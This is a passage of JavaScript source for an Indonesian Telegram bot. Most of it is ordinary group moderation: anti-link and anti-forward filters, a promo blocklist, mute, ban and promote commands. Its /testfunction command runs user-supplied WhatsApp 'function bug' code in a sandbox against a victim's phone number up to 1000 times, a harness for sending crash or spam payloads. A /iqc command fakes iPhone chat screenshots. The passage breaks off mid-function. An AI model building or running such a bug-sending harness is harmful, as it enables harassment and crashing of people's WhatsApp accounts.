    const buffer = Buffer.from(response.data, "binary");

    await bot.sendPhoto(chatId, buffer, {
      caption: `\`\`\`
「 💢 Dilz No Mercy 」\`\`\`
━━━━━━━━━━━━━━━━━━
Chat : \`${text}\`
Time : ${time}
Baterry : ${battery}%
Kartu : ${carrier}
━━━━━━━━━━━━━━━━━━\`\`\`
「 🍒 Darth Insidious 」\`\`\`
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝖠𝗎𝗍𝗁𝗈𝗋 」", url: "https://t.me/dickxmod" }],
          [{ text: "「 ! 」", url: "https://t.me/testidilz21" }]
        ]
      }
    });
  } catch (err) {
    console.error(err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses gambar.");
  }
});




///-----------( Notifikasi Developer )----------\\\
bot.onText(/^\/Notif(?:\s+([\s\S]+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
  const message = match[1];

  if (!message) {
    return bot.sendMessage(chatId, `⚠️ *Gunakan format:*\n/Notif <pesan kamu>`, {
      parse_mode: "Markdown",
      reply_to_message_id: msg.message_id,
    });
  }

  try {
    const apiUrl = `https://api.telegram.org/bot${TOKEN_DEVELOPER}/sendMessage`;

    const content = `\`\`\`
「 𝖧𝖺𝗅𝗅𝗈 DilzMod 」\`\`\`
──────────────
💢 NOTIFIKASI BARU DARI PENGGUNA
🍒 Pengirim: ${username}
🆔 ID: ${userId}
💬 Pesan : ${message}
──────────────
`;

    await axios.post(apiUrl, {
      chat_id: ID_DEVELOPER,
      text: content,
      parse_mode: "Markdown",
    });

    await bot.sendMessage(chatId, "💢 Pesan Berhasil Terkirim", {
      reply_to_message_id: msg.message_id,
    });
  } catch (err) {
    console.error("Gagal kirim notif:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengirim pesan ke developer. Coba lagi nanti.", {
      reply_to_message_id: msg.message_id,
    });
  }
});

///-----------( Tools Group )----------\\
function loadJSON(fileName, fallback = {}) {
    const filePath = path.join(DB_DIR, fileName);
    try {
        if (fs.existsSync(filePath)) {
            return JSON.parse(fs.readFileSync(filePath, 'utf8'));
        }
        fs.writeFileSync(filePath, JSON.stringify(fallback, null, 2));
        return fallback;
    } catch (err) {
        console.error(`Error loading ${fileName}:`, err.message);
        fs.writeFileSync(filePath, JSON.stringify(fallback, null, 2));
        return fallback;
    }
}

function saveJSON(fileName, data) {
    const filePath = path.join(DB_DIR, fileName);
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
}

// ✅ PERBAIKAN: Langsung pakai nama file, bukan DB_DIR.dataFiles.xxx
let blocklist = loadJSON("blocklist.json", []);

let antiLink = {};
let antiPromo = {};
let linkCount = {};
let promoCount = {};
let antiForwardGroups = [];

// ON / OFF
bot.onText(/^\/antiforward (on|off)$/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (msg.chat.type === 'private') {
      return bot.sendMessage(chatId, '❌ Hanya untuk grup');
    }

    const member = await bot.getChatMember(chatId, userId);
    if (!member || !['administrator', 'creator'].includes(member.status)) {
      return bot.sendMessage(chatId, '❌ Khusus admin');
    }

    const mode = match[1].toLowerCase();

    if (mode === 'on') {
      if (!antiForwardGroups.includes(chatId)) {
        antiForwardGroups.push(chatId);
      }
      bot.sendMessage(chatId, '✅ Anti forward ON');
    } else {
      antiForwardGroups = antiForwardGroups.filter(id => id !== chatId);
      bot.sendMessage(chatId, '❌ Anti forward OFF');
    }

  } catch (e) {
    console.log(e);
  }
});

// DETECT FORWARD
bot.on('message', async (msg) => {
  try {
    const chatId = msg.chat.id;

    if (msg.chat.type === 'private') return;
    if (!antiForwardGroups.includes(chatId)) return;

    if (
      msg.forward_from ||
      msg.forward_from_chat ||
      msg.forward_sender_name ||
      msg.forward_date
    ) {
      await bot.deleteMessage(chatId, msg.message_id).catch(() => {});

      const name = msg.from.username
        ? '@' + msg.from.username
        : msg.from.first_name;

      const warn = await bot.sendMessage(
        chatId,
        `⚠️ ${name} dilarang kirim forward!`
      );

      setTimeout(() => {
        bot.deleteMessage(chatId, warn.message_id).catch(() => {});
      }, 3000);
    }

  } catch (e) {
    console.log(e);
  }
});
bot.onText(/\/antilink (.+)/, (msg, match) => {
    const senderId = msg.from.id;
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(msg.chat.id, msg.from.username);
    }
    
    antiLink[msg.chat.id] = match[1] === "on";
    bot.sendMessage(msg.chat.id, `Anti-Link: ${match[1] === "on" ? "AKTIF" : "NONAKTIF"}`);
});

bot.onText(/\/antipromosi (.+)/, (msg, match) => {
    const senderId = msg.from.id;
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(msg.chat.id, msg.from.username);
    }
    
    antiPromo[msg.chat.id] = match[1] === "on";
    bot.sendMessage(msg.chat.id, `Anti-Promosi: ${match[1] === "on" ? "AKTIF" : "NONAKTIF"}`);
});

bot.onText(/\/addantipromosi (.+)/, (msg, match) => {
    const senderId = msg.from.id;
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(msg.chat.id, msg.from.username);
    }
    
    const word = match[1].toLowerCase();
    if (!blocklist.includes(word)) {
        blocklist.push(word);
        saveJSON("blocklist.json", blocklist);
        bot.sendMessage(msg.chat.id, `✅ Kata "${word}" ditambahkan ke blocklist.`);
    } else {
        bot.sendMessage(msg.chat.id, `⚠️ Kata "${word}" sudah ada di blocklist.`);
    }
});

bot.onText(/\/delantipromosi (.+)/, (msg, match) => {
    const senderId = msg.from.id;
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(msg.chat.id, msg.from.username);
    }
    
    const word = match[1].toLowerCase();
    const index = blocklist.indexOf(word);
    if (index !== -1) {
        blocklist.splice(index, 1);
        saveJSON("blocklist.json", blocklist);
        bot.sendMessage(msg.chat.id, `✅ Kata "${word}" dihapus dari blocklist.`);
    } else {
        bot.sendMessage(msg.chat.id, `⚠️ Kata "${word}" tidak ditemukan di blocklist.`);
    }
});

bot.onText(/\/listblocklist/, (msg) => {
    const senderId = msg.from.id;
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(msg.chat.id, msg.from.username);
    }
    
    if (blocklist.length === 0) {
        return bot.sendMessage(msg.chat.id, `📋 Blocklist masih kosong.`);
    }
    
    const list = blocklist.map((w, i) => `${i + 1}. ${w}`).join("\n");
    bot.sendMessage(msg.chat.id, `🐼 BLOCKLIST\n\n${list}`);
});

const linkRegex = /(https?:\/\/|www\.|t\.me|wa\.me|\.com|\.net|discord\.gg|telegram\.me)/i;

bot.on("message", (msg) => {
    // Skip jika bukan pesan teks atau dari bot
    if (!msg.text || msg.from.is_bot) return;
    
    // Cek fungsi shouldIgnoreMessage jika ada
    if (typeof shouldIgnoreMessage === 'function' && shouldIgnoreMessage(msg)) return;
    
    const text = msg.text.toLowerCase().replace(/\s+/g, "");
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    
    // Skip untuk owner/admin biar gak kena sanksi
    if (isOwner(senderId) || isAdmin(senderId)) return;
    
    // Cek anti promosi
// ========== DATA PROMOSI ==========
let promoCount = {}; // { senderId: jumlah }

if (antiPromo[chatId]) {
  for (const w of blocklist) {
    if (text.includes(w)) {
      // Hapus pesan
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      
      // Hitung pelanggaran
      if (!promoCount[senderId]) promoCount[senderId] = 0;
      promoCount[senderId]++;
      
      // Cek apakah sudah 3 kali
      if (promoCount[senderId] >= 3) {
        // MUTE USER (tidak bisa kirim pesan)
        bot.restrictChatMember(chatId, senderId, { can_send_messages: false }).catch(() => {});
        bot.sendMessage(chatId, `🔇 *${msg.from.first_name}* telah di-MUTE otomatis!`, { parse_mode: "Markdown" });
        
        // Reset counter
        promoCount[senderId] = 0;
        
        // Opsional: kirim notifikasi ke admin
       // bot.sendMessage(OWNER_ID, `⚠️ *USER DI-MUTE OTOMATIS*\n👤 Nama: ${msg.from.first_name}\n🆔 ID: ${senderId}\n📌 Grup: ${msg.chat.title}\n📋 Alasan: 3x kirim promosi`, { parse_mode: "Markdown" });
        
      } else {
        // Kirim peringatan
        const sisa = 3 - promoCount[senderId];
        bot.sendMessage(chatId, `⚠️ *PROMOSI TERDETEKSI!*\n\n📌 Pesan dihapus.\n📊 Peringatan: ${promoCount[senderId]}/3\n⏳ ${sisa}x lagi akan di-MUTE!`, { parse_mode: "Markdown" });
      }
      
      return; // Stop pengecekan
    }
  }
}
    
    // Cek anti link
    if (antiLink[chatId] && linkRegex.test(text)) {
        bot.deleteMessage(chatId, msg.message_id).catch(() => {});
        
        if (!linkCount[senderId]) linkCount[senderId] = 0;
        linkCount[senderId]++;
        
        if (linkCount[senderId] >= 3) {
            bot.restrictChatMember(chatId, senderId, { can_send_messages: false }).catch(() => {});
            bot.sendMessage(chatId, `🔇 @${msg.from.username} telah di-mute otomatis (3x kirim link)!`);
            // Reset counter setelah mute
            linkCount[senderId] = 0;
        } else {
            bot.sendMessage(chatId, `⚠️ @${msg.from.username} Jangan kirim link! (${linkCount[senderId]}/3)`);
        }
    }
});

// === /DEMOTE ADMIN DI TELEGRAM ===
bot.onText(/^\/demote$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (String(senderId) !== String(OWNER_ID)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa pake perintah ini.");
  }

  const reply = msg.reply_to_message;
  if (!reply) return bot.sendMessage(chatId, "❌ Balas pesan user yang mau di-demote.");

  const userId = reply.from.id;

  try {
    await bot.promoteChatMember(chatId, userId, {
      can_change_info: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: false,
      can_promote_members: false
    });

    bot.sendMessage(chatId, `✅ Sukses demote [user](tg://user?id=${userId}).`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal demote: ${err.message}`);
  }
});
// === /PROMOTE DENGAN CUSTOM ADMIN TITLE DI TELEGRAM ===
bot.onText(/^\/promote(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (String(senderId) !== String(OWNER_ID)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa pake perintah ini.");
  }

  const reply = msg.reply_to_message;
  if (!reply) return bot.sendMessage(chatId, "❌ Balas pesan user yang mau di-promote.");

  const userId = reply.from.id;
  const label = match[1]?.trim();

  try {
    // Step 1: promote
    await bot.promoteChatMember(chatId, userId, {
      can_change_info: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: true,
      can_promote_members: false
    });

    // Step 2: kalau ada label, set sebagai custom admin title
    if (label) {
      await bot.setChatAdministratorCustomTitle(chatId, userId, label);
    }

    const name = reply.from.username ? `@${reply.from.username}` : `[user](tg://user?id=${userId})`;
    const status = label ? `\`${label}\`` : "*Admin*";

    bot.sendMessage(chatId, `✅ ${name} sekarang jadi ${status}`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal promote: ${err.message}`);
  }
});
bot.onText(/\/info/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username;

    if (shouldIgnoreMessage(msg)) return;

    const repliedMessage = msg.reply_to_message;

    //--- PERUBAHAN: Cek apakah ada balasan (reply) ---
    if (!repliedMessage) {
       
        const replyOptions = {
            reply_to_message_id: msg.message_id, 
            parse_mode: 'Markdown',              
        };
        try {
            await bot.sendMessage(
                chatId,
                `
╭━━「 INFO KAMU 」⬣
×͜× Username: ${username ? `@${username}` : 'Tidak ada'}
×͜× ID: \`${senderId}\`
╰────────────────⬣
`,
                replyOptions
            );
        } catch (error) {
            console.error("Error saat mengirim pesan:", error);
            await bot.sendMessage(chatId, "⚠️  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });

        }
        return; // Hentikan eksekusi lebih lanjut
    }

    //--- KODE SEBELUMNYA UNTUK BALASAN PESAN (TIDAK ADA PERUBAHAN DI SINI) ---
    const repliedUserId = repliedMessage.from?.id;

    if (!repliedMessage.from) {
        const errorMessage = "⚠️  Pesan yang Anda balas tidak memiliki informasi pengirim.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }

    if (!repliedUserId) {
        const errorMessage = "⚠️  Pesan yang Anda balas tidak memiliki ID pengguna.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }
    const repliedUsername = repliedMessage.from.username;
    const repliedFirstName = repliedMessage.from.first_name;
    const repliedLastName = repliedMessage.from.last_name;
    const repliedFullName = repliedFirstName + (repliedLastName ? ` ${repliedLastName}` : '');

    const replyOptions = {
        reply_to_message_id: msg.message_id,
        parse_mode: 'Markdown',
    };

    try {
        await bot.sendMessage(
            chatId,
            `
╭━━「 INFO PENGGUNA 」━━━⬣
×͜× Username: ${repliedUsername ? `@${repliedUsername}` : 'Tidak ada'}
×͜× ID: \`${repliedUserId}\`
×͜× Nama: \`${repliedFullName}\`
╰────────────────⬣
*Diminta oleh* [${username ? `@${username}` : 'Anda'}]`,
            replyOptions
        );
    } catch (error) {
        console.error("Error saat mengirim pesan:", error);
        await bot.sendMessage(chatId, "⚠️  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });
    }
});

// ========== CEK APAKAH TARGET ADALAH ADMIN ==========
async function isTargetAdmin(chatId, targetId) {
    try {
        const chatMember = await bot.getChatMember(chatId, targetId);
        return ['creator', 'administrator'].includes(chatMember.status);
    } catch (err) {
        return false;
    }
}

// ========== CEK APAKAH TARGET ADALAH ADMIN ==========
async function isTargetAdmin(chatId, targetId) {
    try {
        const chatMember = await bot.getChatMember(chatId, targetId);
        return ['creator', 'administrator'].includes(chatMember.status);
    } catch (err) {
        return false;
    }
}

// ========== CEK APAKAH BOT ADALAH ADMIN ==========
async function isBotAdmin(chatId) {
    try {
        const botMe = await bot.getMe();
        const botMember = await bot.getChatMember(chatId, botMe.id);
        return ['creator', 'administrator'].includes(botMember.status);
    } catch (err) {
        return false;
    }
}

// ========== COMMAND MUTE (REPLY ONLY) ==========
bot.onText(/^\/mute$/, async (msg) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(chatId, msg.from.username);
    }
    
    if (!await isBotAdmin(chatId)) {
        return bot.sendMessage(chatId, "❌ Bot harus menjadi admin grup terlebih dahulu!");
    }
    
    // WAJIB REPLY!
    if (!msg.reply_to_message) {
        return bot.sendMessage(
            chatId, 
            "❌ *Cara penggunaan /mute:*\n\n" +
            "Reply pesan target, lalu ketik `/mute`\n\n" +
            "Contoh: Reply pesan orangnya → ketik /mute",
            { parse_mode: "Markdown" }
        );
    }
    
    const target = msg.reply_to_message.from;
    const targetUsername = target.username || target.id;
    
    // Cek jangan mute admin/owner
    if (await isTargetAdmin(chatId, target.id)) {
        return bot.sendMessage(chatId, `❌ Tidak bisa mute admin/owner!`);
    }
    
    // Jangan mute diri sendiri
    if (target.id === senderId) {
        return bot.sendMessage(chatId, `❌ Tidak bisa mute diri sendiri!`);
    }
    
    try {
        await bot.restrictChatMember(chatId, target.id, {
            can_send_messages: false,
            can_send_media_messages: false,
            can_send_other_messages: false,
            can_add_web_page_previews: false
        });
        
        bot.sendMessage(chatId, `🔇 @${targetUsername} telah di-mute.`);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal mute: ${err.message}`);
    }
});

// ========== COMMAND UNMUTE (REPLY ONLY) ==========
bot.onText(/^\/unmute$/, async (msg) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(chatId, msg.from.username);
    }
    
    if (!await isBotAdmin(chatId)) {
        return bot.sendMessage(chatId, "❌ Bot harus menjadi admin grup terlebih dahulu!");
    }
    
    // WAJIB REPLY!
    if (!msg.reply_to_message) {
        return bot.sendMessage(
            chatId, 
            "❌ *Cara penggunaan /unmute:*\n\n" +
            "Reply pesan target, lalu ketik `/unmute`\n\n" +
            "Contoh: Reply pesan orangnya → ketik /unmute",
            { parse_mode: "Markdown" }
        );
    }
    
    const target = msg.reply_to_message.from;
    const targetUsername = target.username || target.id;
    
    try {
        await bot.restrictChatMember(chatId, target.id, {
            can_send_messages: true,
            can_send_media_messages: true,
            can_send_other_messages: true,
            can_add_web_page_previews: true
        });
        
        bot.sendMessage(chatId, `🔊 @${targetUsername} telah di-unmute.`);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal unmute: ${err.message}`);
    }
});

// ========== COMMAND BAN (REPLY ONLY) ==========
bot.onText(/^\/ban$/, async (msg) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(chatId, msg.from.username);
    }
    
    if (!await isBotAdmin(chatId)) {
        return bot.sendMessage(chatId, "❌ Bot harus menjadi admin grup terlebih dahulu!");
    }
    
    // WAJIB REPLY!
    if (!msg.reply_to_message) {
        return bot.sendMessage(
            chatId, 
            "❌ *Cara penggunaan /ban:*\n\n" +
            "Reply pesan target, lalu ketik `/ban`\n\n" +
            "Contoh: Reply pesan orangnya → ketik /ban",
            { parse_mode: "Markdown" }
        );
    }
    
    const target = msg.reply_to_message.from;
    const targetUsername = target.username || target.id;
    
    // Cek jangan ban admin/owner
    if (await isTargetAdmin(chatId, target.id)) {
        return bot.sendMessage(chatId, `❌ Tidak bisa ban admin/owner!`);
    }
    
    // Jangan ban diri sendiri
    if (target.id === senderId) {
        return bot.sendMessage(chatId, `❌ Tidak bisa ban diri sendiri!`);
    }
    
    try {
        await bot.banChatMember(chatId, target.id);
        bot.sendMessage(chatId, `⛔ @${targetUsername} telah di-ban dari grup.`);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal ban: ${err.message}`);
    }
});

// ========== COMMAND UNBAN (REPLY OR ID) ==========
bot.onText(/^\/unban(?:\s+(\d+))?$/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(chatId, msg.from.username);
    }
    
    if (!await isBotAdmin(chatId)) {
        return bot.sendMessage(chatId, "❌ Bot harus menjadi admin grup terlebih dahulu!");
    }
    
    let target = null;
    let targetUsername = null;
    
    // 1. Dari reply (jika pesan yang di-reply masih ada)
    if (msg.reply_to_message) {
        target = msg.reply_to_message.from;
        targetUsername = target.username || target.id;
    }
    
    // 2. Dari ID langsung (karena user sudah di-ban, biasanya gak bisa di-reply)
    if (!target && match[1]) {
        target = { id: parseInt(match[1]) };
        targetUsername = match[1];
    }
    
    if (!target) {
        return bot.sendMessage(
            chatId, 
            "❌ *Cara penggunaan /unban:*\n\n" +
            "1. Reply pesan orang yang sudah di-ban (jika masih ada di grup)\n" +
            "2. Ketik `/unban user_id`\n\n" +
            "*Note:* User ID bisa dilihat dari log bot",
            { parse_mode: "Markdown" }
        );
    }
    
    try {
        await bot.unbanChatMember(chatId, target.id);
        bot.sendMessage(chatId, `✅ ${targetUsername} telah di-unban dan bisa join kembali.`);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal unban: ${err.message}`);
    }
});

// ========== COMMAND YANG TIDAK BUTUH TARGET (OPEN/CLOSE GRUP) ==========
bot.onText(/^\/opengb$/, async (msg) => {
    const senderId = msg.from.id;
    
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(msg.chat.id, msg.from.username);
    }
    
    bot.setChatPermissions(msg.chat.id, {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true
    }).catch(() => {});
    
    bot.sendMessage(msg.chat.id, "🔓 *Grup telah dibuka!*", { parse_mode: "Markdown" });
});

bot.onText(/^\/closegb$/, async (msg) => {
    const senderId = msg.from.id;
    
    if (!isOwner(senderId) && !isAdmin(senderId)) {
        return sendAccessDenied(msg.chat.id, msg.from.username);
    }
    
    bot.setChatPermissions(msg.chat.id, { can_send_messages: false }).catch(() => {});
    bot.sendMessage(msg.chat.id, "🔒 *Grup berhasil ditutup!*", { parse_mode: "Markdown" });
});

///----------( Open )----------\\\
bot.onText(/^\/?open$/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  if (!reply || !reply.document) {
    return bot.sendMessage(
      chatId,
      "💢 Reply To File"
    );
  }

  const fileId = reply.document.file_id;
  const fileName = reply.document.file_name;

  try {
    const fileLink = await bot.getFileLink(fileId);
    const res = await fetch(fileLink);
    const content = await res.text();

    const preview =
      content.length > 3800
        ? content.substring(0, 3800) + "\n\n... Sory File Terpotong"
        : content;

    const text = `\`\`\`
「 DilzMod 𝖭𝗈 𝖬𝖾𝗋𝖼𝗒 」\`\`\`
╭─⭓ Isi File ────
│ 🍂 ${fileName}
╰───────────────⭓
──────────────
\`\`\`javascript
${preview}
\`\`\`
──────────────
`;

    await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Gagal membaca file: ${err.message}`);
  }
});

///----------( Cek Function )----------\\\
const CHECKER_APIS = [
  "https://api.akulaku.cloud/js/validate",
  "https://api.codetabs.com/js/validate",
  "https://api.gatum.tech/jslint",
  "https://jslint.win/api/check"
];

// Fungsi panggil API berurutan
async function cekDenganBackup(kode) {
  for (let url of CHECKER_APIS) {
    try {
      const res = await axios.post(url, { code: kode }, { timeout: 10000 });
      return { success: true, url, data: res.data };
    } catch (e) {
      console.log(`API gagal: ${url}`);
    }
  }
  return { success: false };
}

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];


  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Nih hasilnya`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.onText(/(?:\/testfunction|testfunction)(?:@\w+)?\s*(.*)/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const fromId = msg.from.id
    
    if (!isOwner(fromId)) {
        return bot.sendMessage(chatId, '❌ Owner Only Command', {
            reply_to_message_id: msg.message_id,
            parse_mode: 'HTML'
        })
    }
    
    if (sessions.size === 0) {
        return bot.sendMessage(chatId, '❌ WhatsApp Tidak Terhubung', { 
            parse_mode: 'HTML',
            reply_to_message_id: msg.message_id
        })
    }

    const fullText = match[1] || ""
    const args = fullText.split(" ")
    if (args.length < 2)
      return bot.sendMessage(chatId, `
<u>TEST FUNCTION BY DILZ</u>

🧬 Format : /testfunction 628xxx 10
🧬 Example : /testfunction 6281234567890 50
🧬 Note : Reply dengan Function atau File .js
      `, {
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
      })

    let number = args[0]
    const jumlah = Math.max(0, Math.min(parseInt(args[1]) || 1, 1000))
    if (isNaN(jumlah) || jumlah <= 0)
      return bot.sendMessage(chatId, '❌ Jumlah Tidak Valid', {
        reply_to_message_id: msg.message_id,
        parse_mode: "HTML"
      })

    const target = number.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
    
    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId, '❌ Reply Dengan Function / File .js', {
        reply_to_message_id: msg.message_id,
        parse_mode: "HTML"
      })
    }

    let funcCode = ""
    let fileName = ""
    
    if (msg.reply_to_message.document && 
        msg.reply_to_message.document.file_name && 
        msg.reply_to_message.document.file_name.endsWith('.js')) {
      
      try {
        const fileId = msg.reply_to_message.document.file_id
        const file = await bot.getFile(fileId)
        const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`
        
        const response = await axios.get(fileUrl)
        funcCode = response.data
        fileName = msg.reply_to_message.document.file_name
        
      } catch (error) {
        return bot.sendMessage(chatId, '❌ Gagal Membaca File .js', {
          reply_to_message_id: msg.message_id,
          parse_mode: "HTML"
        })
      }
      
    } 
    else if (msg.reply_to_message.text) {
      funcCode = msg.reply_to_message.text
    } 
    else {
      return bot.sendMessage(chatId, '❌ Reply Dengan Function / File .js', {
        reply_to_message_id: msg.message_id,
        parse_mode: "HTML"
      })
    }

    const processMsg = await bot.sendMessage(
      chatId,`
<u>STATUS WITH YOUR FUNCTION BUG</u>

🧬 Target : ${number}
🧬 Type : ${fileName ? `File: ${fileName}` : 'Uknown Function'}
🧬 Potential Ban : N/a
🧬 Status : Analyzing...
`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🎀 Numero", url: `https://wa.me/${number}` }]
          ]
        }
      }
    )
    const processMessageId = processMsg.message_id

    const asyncFunctionRegex = /async\s+function\s+(\w+)/g
    const matches = [...funcCode.matchAll(asyncFunctionRegex)]
    
    if (matches.length === 0) {
      await bot.editMessageText(
        `❌ Tidak Ditemukan Async Function`,
        {
          chat_id: chatId,
          message_id: processMessageId,
          parse_mode: "HTML"
        }
      )
      return
    }
    
    const funcName = matches[0][1]

    const safeSock = createSafeSock(sock)
    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser
    }
    const context = vm.createContext(sandbox)

    let parseError = null
    try {
      vm.runInContext(funcCode, context)
    } catch (err) {
      parseError = err
    }

    const fn = context[funcName]
    if (parseError || typeof fn !== 'function') {
      const errorMessage = parseError ? 
        `Error: ${parseError.message}` :
        `Function "${funcName}" Tidak Ditemukan`
      
      await bot.editMessageText(
        `❌ ${errorMessage}`,
        {
          chat_id: chatId,
          message_id: processMessageId,
          parse_mode: "HTML"
        }
      )
      return
    }

    await bot.editMessageText(`
<u>STATUS WITH YOUR FUNCTION BUG</u>

🧬 Target : ${number}
🧬 Type : ${fileName ? `File: ${fileName}` : 'Uknown Function'}
🧬 Function : ${funcName}
🧬 Potential Ban : N/a
🧬 Status : Sending... 0/${jumlah}`,
      {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🎀 Numero", url: `https://wa.me/${number}` }]
          ]
        }
      }
    )

    let successCount = 0
    let failCount = 0
    let errorMessages = []
    let lastError = null
    
    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length
        if (arity === 1) {
          await fn(target)
        } else if (arity === 2) {
          await fn(safeSock, target)
        } else {
          await fn(safeSock, target, true)
        }
        successCount++
      } catch (err) {
        failCount++
        lastError = err
        
        const errMsg = err.message || "Unknown error"
        if (!errorMessages.includes(errMsg) && errorMessages.length < 3) {
          errorMessages.push(errMsg)
        }
        
        console.error(`Execution ${i+1} failed:`, errMsg)
      }
      
      if ((i + 1) % 10 === 0 || i === jumlah - 1) {
        try {
          await bot.editMessageText(
            `<u>STATUS WITH TRAVAS</u>

🧬 Target : ${number}
🧬 Type : ${fileName ? `File: ${fileName}` : 'Uknown Function'}
🧬 Function : ${funcName}
🧬 Potential Ban : N/a
🧬 Status : Sending... (${i+1}/${jumlah})
🧬 Success : ${successCount} | ❌ Failed : ${failCount}`,
            {
              chat_id: chatId,
              message_id: processMessageId,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [{ text: "🎀 Numero", url: `https://wa.me/${number}` }]
                ]
              }
            }
          )
        } catch (e) {
        }
      }
      
      await sleep(200)
    }

    let errorCaption = ""
